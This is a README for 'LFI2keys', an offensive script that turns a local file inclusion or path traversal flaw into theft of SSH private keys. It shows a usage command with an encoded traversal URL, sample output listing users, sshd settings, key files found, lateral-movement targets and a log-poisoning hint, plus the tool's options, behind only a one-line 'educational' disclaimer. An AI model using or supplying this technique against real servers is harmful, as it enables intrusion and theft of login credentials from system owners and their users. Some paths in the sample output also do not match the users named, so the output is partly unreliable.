## Summary
Found a local file inclusion or path traversal vulnerability? Automate the extraction of SSH private keys with LFI2keys. It uses the exposed `/etc/passwd` file to extract valid users, checks for commonly named SSH keys, and gathers useful SSH configuration details from `/etc/ssh/sshd_config`.

## Usage
Provide the full URL of the vulnerable endpoint where you can read the `/etc/passwd` file, and supply a private key [wordlist](https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists). Use the `-v` parameter for verbose output and for printing the found private key.

```bash
┌──(kali㉿DC07 | 2025-02-12 00:13:37)-[~]
└─$ python3 lfi2keys.py -u https://127.0.0.1/cgi-bin/.%2e/.%2e/etc/passwd -l ssh-priv-key-loot-extended.txt -a -o keys.txt

  _    ___ ___ ___ _  _______   _____ 
 | |  | __|_ _|_  ) |/ / __\ \ / / __|
 | |__| _| | | / /|   <| _| \ V /\__ \
 |____|_| |___/___|_|\_\___| |_| |___/

LFI to SSH Private Keys - Automated Looting Script

[*] The script provided is for educational purposes only, I am not responsible for your actions.
[+] Valid /etc/passwd file found
[+] Valid users exported:
    root -> /root (UID: 0)
    miranda -> /home/miranda (UID: 1001)
    steven -> /home/steven (UID: 1002)
    mark -> /home/mark (UID: 1003)
    nick -> /home/nick (UID: 1004)
[+] /etc/ssh/sshd_config file found
    PermitRootLogin: disabled
    PubkeyAuthentication: enabled
    PasswordAuthentication: disabled
    ChallengeResponseAuthentication: disabled
[+] Checking for SSH metadata (authorized_keys, known_hosts and .ssh/config)...
[!] Found authorized_keys for nick: https://127.0.0.1/cgi-bin/.%2e/.%2e/nick/.ssh/authorized_keys
[!] Found authorized_keys.bak for nick: https://127.0.0.1/cgi-bin/.%2e/.%2e/nick/.ssh/authorized_keys.bak
[!] Found known_hosts for miranda: https://127.0.0.1/cgi-bin/.%2e/.%2e/nick/.ssh/known_hosts
[!] SSH config found for mark (https://127.0.0.1/cgi-bin/.%2e/.%2e/mark/.ssh/config) - possible lateral movement
    Host: TestServer
       HostName: 192.168.1.10
       User: Thunderdome
       Port: 2222
       IdentityFile: ~/.ssh/gabber.key
[!] Private key found for mark at: https://127.0.0.1/cgi-bin/.%2e/.%2e/mark/.ssh/gabber.key
[+] Starting to FUZZ
[!] Private key found for nick at: https://127.0.0.1/cgi-bin/.%2e/.%2e/nick/.ssh/id_rsa
[!] Private key found for steven at: https://127.0.0.1/cgi-bin/.%2e/.%2e/home/test/.ssh/id_ecdsa-sk
[+] No accessible SSH keys found for additional directories
[!] Log file found: https://127.0.0.1/cgi-bin/.%2e/.%2e/var/log/auth.log - this file may be used for log poisoning if writable
[+] Results saved to keys.txt
[+] Done (～￣▽￣)～
```

## Options
```bash
  -h, --help            show this help message and exit
  -u, --url URL         LFI URL pointing to /etc/passwd
  -l, --list LIST       Wordlist containing SSH private key names
  -o, --output OUTPUT   File to save found private key URLs and contents
  -p, --proxy PROXY     Proxy URL (e.g., http://127.0.0.1:8080)
  -v, --verbose         Enable verbose mode for debugging
  -a, --all             Also search the entire home directory and additional paths
  --ignore-403          Continue scanning even if a 403 status code is encountered
  --no-rate-limit       Disable rate limiting on proxy (for debug/testing purposes)
  -c, --continue-on-success
                        Continue scanning all users for private keys even after a match is found
```

## Disclaimer
The script provided is for educational purposes only, I am not responsible for your actions.

### Credits
- [PinoyWH1Z](https://github.com/PinoyWH1Z) for his [SSH private key wordlists](https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists).
